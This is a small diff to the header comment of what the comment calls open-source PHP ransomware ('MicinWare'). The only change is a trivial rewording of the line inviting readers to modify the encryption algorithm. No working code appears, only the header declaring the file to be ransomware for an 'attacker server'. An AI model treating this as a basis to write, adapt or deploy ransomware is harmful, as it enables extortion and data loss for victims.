@@ -3,7 +3,7 @@
 * @author Krypton aka GreyCat aka 0x00b0
 * @copyright ExploreOurBrain - 2019
 * put into attacker server
-* you can modify it and change to another algorithm
+* you can modify and change to another algorithm
 * Open Source PHP RansomeWare - MicinWare
 
 * Disclaimer : 
